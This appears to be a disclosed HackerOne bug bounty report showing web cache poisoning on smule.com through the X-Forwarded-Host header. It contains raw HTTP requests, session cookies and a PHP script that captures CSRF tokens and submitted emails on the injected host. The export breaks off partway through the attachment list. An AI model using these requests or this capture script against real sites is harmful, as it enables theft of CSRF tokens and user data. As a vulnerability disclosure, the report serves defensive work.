{
  "id": 504514,
  "global_id": "Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDQ1MTQ=",
  "url": "https://hackerone.com/reports/504514",
  "title": "Web cache poisoning leads to disclosure of CSRF token and sensitive information",
  "state": "Closed",
  "substate": "resolved",
  "severity_rating": "medium",
  "readable_substate": "Resolved",
  "created_at": "2019-03-03T17:17:52.679Z",
  "submitted_at": "2019-03-03T17:17:52.679Z",
  "is_member_of_team?": false,
  "is_organization_group_member?": false,
  "reporter": {
    "disabled": false,
    "username": "d3f4u17",
    "url": "/d3f4u17",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98"
    },
    "is_me?": false,
    "cleared": true,
    "verified": true,
    "hackerone_triager": false,
    "hacker_mediation": false
  },
  "team": {
    "id": 23970,
    "url": "https://hackerone.com/smule",
    "handle": "smule",
    "profile_picture_urls": {
      "small": "https://profile-photos.hackerone-user-content.com/variants/000/023/970/86155a522b43459fc587e2ff56745e1f531e823e_original.png/d3dc6b2d7e2dc3657e8861b0d7e2dfca1a6d513dd784c613f4e56738907cea98",
      "medium": "https://profile-photos.hackerone-user-content.com/variants/000/023/970/86155a522b43459fc587e2ff56745e1f531e823e_original.png/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
    },
    "permissions": [

    ],
    "submission_state": "open",
    "default_currency": "usd",
    "awards_miles": false,
    "offers_bounties": false,
    "state": "public_mode",
    "only_cleared_hackers": false,
    "pentest_feature_enabled?": false,
    "profile": {
      "name": "Smule",
      "twitter_handle": "smule",
      "website": "https://www.smule.com",
      "about": "Smule is making music social, interactive, and collaborative again. "
    }
  },
  "has_bounty?": false,
  "in_validation?": false,
  "can_view_team": true,
  "can_view_report": true,
  "is_external_bug": false,
  "is_published": false,
  "is_participant": false,
  "has_collaborators": false,
  "submitted_by_team_member": false,
  "stage": 4,
  "public": true,
  "visibility": "full",
  "cve_ids": [

  ],
  "singular_disclosure_disabled": false,
  "disclosed_at": "2019-07-21T06:17:59.380Z",
  "bug_reporter_agreed_on_going_public_at": "2019-06-21T06:17:59.222Z",
  "team_member_agreed_on_going_public_at": null,
  "comments_closed?": false,
  "facebook_team?": false,
  "team_private?": false,
  "vulnerability_information": "**Summary:** \n\nThe page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) is vulnerable to web cache poisoning.\n\n**Description:**\n\nThe page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) is vulnerable to web cache poisoning, on adding `X-Forwarded-Host` header to the request multiple request links get change which leads a user to make requests to a third party website.\n\n## Steps To Reproduce:\n\n*  Intercept the request to the following page [https://www.smule.com/s/smule_groups/user_groups/user_name](https://www.smule.com/s/smule_groups/user_groups/fossnow27) using burp suite or any other tool.\n\n```\nGET /s/smule_groups/user_groups/fossnow27 HTTP/1.1\nHost: www.smule.com\nX-Forwarded-Host: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794; smule_cookie_banner_disabled=true; _ga=GA1.2.1744768224.1551586925; _gid=GA1.2.2071077738.1551586925; L=N; _smule_web_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJTY4Nzc0ZDQxYjdiYmEyYTlmNmRkZTk3NjYwYmRlMDBkBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMWhmSkdDZk9XcGhHajc5dXFHd1FYc1NhUnh0eGtjVHBocG1Sb3RubldlNDg9BjsARg%3D%3D--4ea860dfb2e3ad2a5a3d49c058f35485961ac5d3; cookies.js=1; smule_autoplay={%22enabled%22:true}; py={%22globalVolume%22:true%2C%22volume%22:0.5}; connection_info=eyJjb3VudHJ5IjoiSU4iLCJob21lUG9wIjoic2ciLCJjb250ZW50UHJveHkiOiJ0YyJ9--16206c9d48aa7c70227255756cc5a9e1e43d3cab\nConnection: close\nUpgrade-Insecure-Requests: 1\nIf-None-Match: W/\"74107fb6dcc410390f339e5ddabc3022\"\nCache-Control: max-age=0\n\n```\nIn the above request I have added X-Forwarded-Host header.\n\n* The response returned is shown below, changing the action links as well as footer links of the page.\n{F434734}\n\n*  Now open the response, and try to login, when you will login following request will be made\n> If you will refresh the page it will ask for resubmission as it is a type of revalidate type of caching.\n\n```\nPOST /user/check_email HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.smule.com/s/smule_groups/user_groups/fossnow27\nX-CSRF-Token: █████████=\nContent-Type: application/x-www-form-urlencoded\nX-Smulen: daf446d26def7faeef4f6527d7f20fae\nContent-Length: 31\nOrigin: https://www.smule.com\nConnection: close\n\nemail=foo%40bar.com\t\n```\nto mimic the reponse of the actual server response I have written the following script\n\n```php\n<?php\nif($_SERVER['REQUEST_METHOD'] == \"OPTIONS\"){\n    if($_SERVER['HTTP_ORIGIN'] == \"https://www.smule.com\"){\n        header('Access-Control-Allow-Origin: *');\n        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');\n        header('Access-Control-Allow-Headers: x-csrf-token,x-smulen');\n        header('Access-Control-Max-Age: 1728000');\n        header(\"Content-Length: 0\");\n        header(\"Content-Type: text/plain\");\n        exit;\n    }\n    else{\n        header(\"HTTP/1.1 403 Access Forbidden\");\n        header(\"Content-Type: text/plain\");\n        echo \"You cannot repeat this request\";\n    }\n}\n\nelse if($_SERVER[\"REQUEST_METHOD\"] == \"POST\"){\n\theader(\"Content-type: application/json; charset=utf-8\");\n\theader(\"Cache-Control: max-age=0, private, must-revalidate\");\n\theader(\"Content-Security-Policy: default-src * data: blob:; frame-ancestors *.smule.com; script-src 'unsafe-inline' 'unsafe-eval' blob: https://boards.greenhouse.io/embed/job_board/js https://js.stripe.com/v2/ https://js.stripe.com/v3/ http://*.smule.com:* http://*.facebook.net http://*.google-analytics.com http://*.google.com http://*.googleapis.com http://*.gstatic.com https://*.smule.com:* https://*.facebook.net https://*.accountkit.com https://*.google-analytics.com https://*.google.com https://*.googleapis.com https://*.gstatic.com http://www.apple.com/library/quicktime/scripts/ac_quicktime.js https://www.apple.com/library/quicktime/scripts/ac_quicktime.js platform.twitter.com https://optimize.google.com; style-src 'unsafe-inline' data: http://*.smule.com:* https://*.smule.com:* yui.yahooapis.com https://optimize.google.com https://fonts.googleapis.com; report-uri /s/csp-log;\");\n\theader(\"X-Frame-Options: SAMEORIGIN\");\n\theader(\"Set-Cookie: smule_id_production=████%3D%3D--a559b392c9fc10711c799307af296a387ec77794;domain=.smule.com; path=/; expires=Fri, 01-Jan-2038 08:00:00 GMT\");\n\theader(\"ETag: W/\\\"5be24db7cb9adabbe965c1850ce0de98\\\"\");\n\theader(\"X-Request-Id: 9c67b0a57e77660dacbefea12085f82f\");\n\t$res = array(\"email\"=>true, \"token\" => $_SERVER[\"HTTP_X_CSRF_TOKEN\"], \"mail\" => $_POST['email']);\n\techo json_encode($res);\n}\n?>\n```\nThe request/respone is shown below:\n\n{F434739}\n\n## Impact:\n\n* CSRF attacks.\n* Sensitive Information leakage. \n\n## Supporting Material/References:\n\n* [https://www.owasp.org/index.php/Cache_Poisoning](https://www.owasp.org/index.php/Cache_Poisoning)\n* [https://portswigger.net/blog/practical-web-cache-poisoning](https://portswigger.net/blog/practical-web-cache-poisoning)\n\n## Impact\n\n* CSRF attacks\n* Information disclosure",
  "weakness": {
    "id": 57,
    "name": "Violation of Secure Design Principles"
  },
  "original_report_id": null,
  "original_report_url": null,
  "attachments": [
    {
      "id": 434734,
      "file_name": "smulewebcache.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/734/dc7afc2df357da5904ab01edfc20b90337e8a9e4/smulewebcache.png?response-content-disposition=attachment%3B%20filename%3D%22smulewebcache.png%22%3B%20filename%2A%3DUTF-8%27%27smulewebcache.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074136Z&X-Amz-Expires=849&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=55167e467414f258ef1f716c88f5bfb6c58cedae82da2fc25c9dc22447b598e8",
      "file_size": 55568,
      "type": "image/png",
      "moderated": null
    },
    {
      "id": 434739,
      "file_name": "smulewebcache3.png",
      "expiring_url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/434/739/563f87438d324986afb4dc686f4e6e004e8e0df1/smulewebcache3.png?response-content-disposition=attachment%3B%20filename%3D%22smulewebcache3.png%22%3B%20filename%2A%3DUTF-8%27%27smulewebcache3.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074136Z&X-Amz-Expires=849&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=1e4bdd5348de266f1061eb9cd2d47af29ea5a72c789b96244434522a5f4b25be",
      "file_size": 93905,
      "type": "image/png",
      "moderated": null
    }
  ],
  "allow_singular_disclosure_at": "2019-07-21T06:17:59.271Z",
  "allow_singular_disclosure_after": -131765017.1400271,
  "singular_disclosure_allowed": true,
  "vote_count": 35,
  "voters": [
    "th3hidd3nmist",
    "mashoud1122",
    "base_64",
    "spam404",
    "ali",
    "dhakal_ananda",
    "mik317",
    "jpdev",
    "d3f4u17",
    "tulswani",
    "and 25 more..."
  ],
  "severity": {
    "rating": "medium",
    "author_type": "Team"
  },
  "structured_scope": {
    "databaseId": 8863,
    "asset_type": "WILDCARD",
    "asset_identifier": "*.smule.com",
    "max_severity": "critical"
  },
  "abilities": {
    "assignable_team_members": [

    ],
    "assignable_team_member_groups": [

    ]
  },
  "activities": [
    {
      "id": 4249317,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Thank you for the report. We're evaluating this and will get back to you.",
      "automated_response": false,
      "created_at": "2019-03-04T01:17:01.325Z",
      "updated_at": "2019-03-04T01:17:01.325Z",
      "actor": {
        "username": "shakataganai",
        "cleared": false,
        "verified": false,
        "url": "/shakataganai",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/000/267/957/76980610f84ca0c4c2eb096e18f21bbbd2c288f1_original.jpg/f4a495c04fdb224bac8ec64587537e511aa8c4925e7955bee0a19e0ed7d891dc"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4275291,
      "is_internal": false,
      "editable": false,
      "type": "Activities::Comment",
      "message": "Any updates??",
      "automated_response": false,
      "created_at": "2019-03-07T13:36:12.483Z",
      "updated_at": "2019-03-07T13:36:12.483Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4286209,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNeedsMoreInfo",
      "message": "We are unable to reproduce this issue. Please provide requests/response for each step. Thank you!\n\n",
      "automated_response": false,
      "created_at": "2019-03-08T15:48:30.995Z",
      "updated_at": "2019-03-08T15:48:30.995Z",
      "actor": {
        "username": "klm",
        "cleared": false,
        "verified": false,
        "url": "/klm",
        "profile_picture_urls": {
          "medium": "/assets/avatars/default-25f7248a18bdf9e2dc8310319b148d66cff430fa0fade6c5f25fee1b8d7f27ed.png"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "genius_execution_id": null,
      "team_handle": "smule"
    },
    {
      "id": 4286687,
      "is_internal": false,
      "editable": false,
      "type": "Activities::BugNew",
      "message": "**Steps to reproduce:**\n\n* Intercept the request to the following URL [https://www.smule.com/s/smule_groups/user_groups/fossnow27](https://www.smule.com/s/smule_groups/user_groups/fossnow27), the request is shown below\n\n```\nGET /s/smule_groups/user_groups/fossnow27 HTTP/1.1\nHost: www.smule.com\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: smule_id_production=████████gyOX0%3D--68470512e6f6f64359dca881ae3850685b20b766; smule_cookie_banner_disabled=true; _ga=GA1.2.1744768224.1551586925; _smule_web_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJTE0NWQ0NmVkM2JmMzU4YjNhNjRhMDM5ZTc4ZTU3YTkxBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMVRiVnBIT1MwRWRYcTIxcnlXSWxQQ2dYbWsrUDVleWtrcWpIVGpCTUQwMGc9BjsARg%3D%3D--5d567b85ec8dc18c8527799cb46ccac771bab5df; cookies.js=1; smule_autoplay={%22enabled%22:true}; py={%22globalVolume%22:true%2C%22volume%22:0.5}; connection_info=eyJjb3VudHJ5IjoiSU4iLCJob21lUG9wIjoic2YiLCJjb250ZW50UHJveHkiOiJ0YyJ9--ce36737f919d530135a38cb242308b6222045721; _gid=GA1.2.623786745.1552060827; _gat=1; L=N\nConnection: close\nUpgrade-Insecure-Requests: 1\nIf-None-Match: W/\"47ea76e57c49a290d0013810f3c620e3\"\nCache-Control: max-age=0\n\n```\n\n*  Add the following header to the above request `X-Forwarded-Host: localhost` (you can use other host too, the mimicing scripts are on my localmachine thats why i have used **localhost**) which will make the final request as\n\n```\nGET /s/smule_groups/user_groups/fossnow27 HTTP/1.1\nHost: www.smule.com\nX-Forwarded-Host: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nCookie: smule_id_production=██████gyOX0%3D--68470512e6f6f64359dca881ae3850685b20b766; smule_cookie_banner_disabled=true; _ga=GA1.2.1744768224.1551586925; _smule_web_session=BAh7B0kiD3Nlc3Npb25faWQGOgZFVEkiJTE0NWQ0NmVkM2JmMzU4YjNhNjRhMDM5ZTc4ZTU3YTkxBjsAVEkiEF9jc3JmX3Rva2VuBjsARkkiMVRiVnBIT1MwRWRYcTIxcnlXSWxQQ2dYbWsrUDVleWtrcWpIVGpCTUQwMGc9BjsARg%3D%3D--5d567b85ec8dc18c8527799cb46ccac771bab5df; cookies.js=1; smule_autoplay={%22enabled%22:true}; py={%22globalVolume%22:true%2C%22volume%22:0.5}; connection_info=eyJjb3VudHJ5IjoiSU4iLCJob21lUG9wIjoic2YiLCJjb250ZW50UHJveHkiOiJ0YyJ9--ce36737f919d530135a38cb242308b6222045721; _gid=GA1.2.623786745.1552060827; _gat=1; L=N\nConnection: close\nUpgrade-Insecure-Requests: 1\nIf-None-Match: W/\"47ea76e57c49a290d0013810f3c620e3\"\nCache-Control: max-age=0\n```\n\n* Now make a request you will get the following response as shown below\n{F437751}\n\n* open the response in a browser and try to login\n{F437756}\n\n* when you will enter email following requests will be made but now to a third party application\n\nrequest-1\n```\nOPTIONS /user/check_email HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nAccess-Control-Request-Method: POST\nAccess-Control-Request-Headers: x-csrf-token,x-smulen\nOrigin: https://www.smule.com\nConnection: close\n```\n{F437780}\n\nrequest-2\n\n```\nPOST /user/check_email HTTP/1.1\nHost: localhost\nUser-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:61.0) Gecko/20100101 Firefox/61.0\nAccept: application/json, text/plain, */*\nAccept-Language: en-GB,en;q=0.5\nAccept-Encoding: gzip, deflate\nReferer: https://www.smule.com/s/smule_groups/user_groups/fossnow27\nX-CSRF-Token: ████\nContent-Type: application/x-www-form-urlencoded\nX-Smulen: 5c39a110f7277a9634de3afab35de6a6\nContent-Length: 19\nOrigin: https://www.smule.com\nConnection: close\n\nemail=foo%40bar.com\n```\n{F434739}\n\n* To catch the requests I tried to mimic the actual server reponse and wrote the following PHP script name **check_email.php**\n\n```php\n<?php\nif($_SERVER['REQUEST_METHOD'] == \"OPTIONS\"){\n    if($_SERVER['HTTP_ORIGIN'] == \"https://www.smule.com\"){\n        header('Access-Control-Allow-Origin: *');\n        header('Access-Control-Allow-Methods: POST, GET, OPTIONS');\n        header('Access-Control-Allow-Headers: x-csrf-token,x-smulen');\n        header('Access-Control-Max-Age: 1728000');\n        header(\"Content-Length: 0\");\n        header(\"Content-Type: text/plain\");\n        exit;\n    }\n    else{\n        header(\"HTTP/1.1 403 Access Forbidden\");\n        header(\"Content-Type: text/plain\");\n        echo \"You cannot repeat this request\";\n    }\n}\n\nelse if($_SERVER[\"REQUEST_METHOD\"] == \"POST\"){\n    header(\"Content-type: application/json; charset=utf-8\");\n    header(\"Cache-Control: max-age=0, private, must-revalidate\");\n    header(\"Content-Security-Policy: default-src * data: blob:; frame-ancestors *.smule.com; script-src 'unsafe-inline' 'unsafe-eval' blob: https://boards.greenhouse.io/embed/job_board/js https://js.stripe.com/v2/ https://js.stripe.com/v3/ http://*.smule.com:* http://*.facebook.net http://*.google-analytics.com http://*.google.com http://*.googleapis.com http://*.gstatic.com https://*.smule.com:* https://*.facebook.net https://*.accountkit.com https://*.google-analytics.com https://*.google.com https://*.googleapis.com https://*.gstatic.com http://www.apple.com/library/quicktime/scripts/ac_quicktime.js https://www.apple.com/library/quicktime/scripts/ac_quicktime.js platform.twitter.com https://optimize.google.com; style-src 'unsafe-inline' data: http://*.smule.com:* https://*.smule.com:* yui.yahooapis.com https://optimize.google.com https://fonts.googleapis.com; report-uri /s/csp-log;\");\n    header(\"X-Frame-Options: SAMEORIGIN\");\n    header(\"Set-Cookie: smule_id_production=█████%3D%3D--a559b392c9fc10711c799307af296a387ec77794;domain=.smule.com; path=/; expires=Fri, 01-Jan-2038 08:00:00 GMT\");\n    header(\"ETag: W/\\\"5be24db7cb9adabbe965c1850ce0de98\\\"\");\n    header(\"X-Request-Id: 9c67b0a57e77660dacbefea12085f82f\");\n    $res = array(\"email\"=>true, \"token\" => $_SERVER[\"HTTP_X_CSRF_TOKEN\"], \"mail\" => $_POST['email']);\n    echo json_encode($res);\n}\n?>\n```\n\nwith the following ** .htaccess** file to mimic the actual request URL\n\n```\nRewriteEngine On\nRewriteCond %{REQUEST_FILENAME} !-f\nRewriteRule ^([^\\.]+)$ $1.php [NC,L]\n```\n\nI have uploaded the following files as **user.zip**",
      "automated_response": false,
      "created_at": "2019-03-08T16:35:35.671Z",
      "updated_at": "2019-06-21T17:34:48.878Z",
      "actor": {
        "username": "d3f4u17",
        "cleared": true,
        "verified": true,
        "url": "/d3f4u17",
        "profile_picture_urls": {
          "medium": "https://profile-photos.hackerone-user-content.com/variants/WVQ792pdimTiEpL8JcJVzyrn/5136ed9b2fa7c4d4abbf39fb971047c62d98ec4740a88eb55d7e26373250a937"
        },
        "hackerone_triager": false,
        "hackerone_employee": false
      },
      "attachments": [
        {
          "id": 437780,
          "filename": "request2.png",
          "type": "image/png",
          "url": "https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/000/437/780/76ea66d12be09871969332c5ae03e3e1a1b5e77a/request2.png?response-content-disposition=attachment%3B%20filename%3D%22request2.png%22%3B%20filename%2A%3DUTF-8%27%27request2.png&response-content-type=image%2Fpng&X-Amz-Algorithm=AWS4-HMAC-SHA256&X-Amz-Credential=ASIAQGK6FURQWZRWVQLW%2F20230923%2Fus-west-2%2Fs3%2Faws4_request&X-Amz-Date=20230923T074136Z&X-Amz-Expires=849&X-Amz-Security-Token=IQoJb3JpZ2luX2VjECoaCXVzLXdlc3QtMiJHMEUCIH4h5RU%2BpbI3mlwEISZD1G9BopBv%2B7sztLbJknQb99SoAiEAvhxLWqtVFV73maMS53mFspg5vBZ3%2BzoNHXmSke7DMlAqsgUIIxADGgwwMTM2MTkyNzQ4NDkiDC7pogsWvzjWL290gCqPBTKeeZOA278oY6KnHe%2FmWuxZ3Qva3oIxiPgSeceppHqQhkbgfD3tsY8pCoJ9VsxHzSlUT0PRdOuJ8sr7ZKZL2JXBIQSfFD%2FndZi2qU1cFtihzUpwWYUUNN5iSpcUDdb5QDC4CvgOQ%2BEvd6tX7y%2F6Q%2BSMOg8q7yp5mzJr5qbY%2BWMbL6nz%2Buay4cd0wnSe6tkjuaJ1NIbjxSdH9CbkBS0XoTSgIOBDeBGuSMPeOJAc2qCCwB3%2FJJzjHbb07dimFwcVQ37AzR3aSdVTIrEy7NTVExSsa71AnpdGMfq2ZWxbVHT4Z6Ep3h5g9prjvXQKlNKYdiX%2BmlPln5qCDc8s7M8gON6CdSii7fH0aBOcu0INjoa4dc%2FOKcwiuirhI9fDfGn4h4w3t9xVEOfQ21OzAu6iCzqwbyX6FcQTYmc1%2FIb4Lr%2BmfHmZPXpM41HYMK9XHVWPs5aSmF5nYp0DtlX53W%2FJIPEUayublSARs02HeVHIz1vwC6fhS3x1128WqIIvz2dgsHmVJmC%2Bi%2BMemNKEsdiaq0lMgNiTe9mDem3SLrvYMO99wYuebZUfCAVBbqea6mN0o6TtPR%2BY4ZiZl0Y57HEgt3yLwEJQ3BmwdmweldY92DYxW1o1ozabvAsUO6MT%2BEI0mkI2tmtaZQ%2B31bwtxLouobN%2FxkZiIs9YPexJAJ6%2F1%2BFYr5HPRh8rib2vpmO4ylsOFgCISJP5yPdziLDBPihHZhMx8CE858zkJIqVtEFfXZ31W%2FNw09acXa5I4%2BC8AMnDBWV%2FqsryQDDwWpVkzUyRJroktjLT8m7IUEVkEXb7s2GO%2BJiidEBoinU5YgVGpMWTmAmcjaFhRA%2FpwdFI%2F7XHri8KUlyGWMlbYK2BDuF74uow5IK5qAY6sQGceMO9KGy75rSGSK9Jhffgp6ECN8Mwct472Z1JRwqPxCECpo4hAM%2BTiqPzt7Rc8yOTYkRKOicKyCebEt1uytTR6HQoyEcj%2FTBDmV%2BwTAA3FljzwsKBDHTaYj%2Bd0h8rsm4W%2BKtqjUgQ%2BsI4FzYNCv9BSWMF%2FnJ7wV%2BwaSDW1OYbdFVrBpkgTxJPCiLvqlbbKjcH%2BuE8HtSqJR%2FjUt%2Bvxx4CmAPJl%2BJDFQWASMAeV4kuGCM%3D&X-Amz-SignedHeaders=host&X-Amz-Signature=13e1eb6e0f05e98e673729a008961963b1fbbf4a3bb3fe5c4166bfa41392cbdb"
        },
        {
          "id": 437770,
          "filename": "user.zip",
          "type": "application/zip",
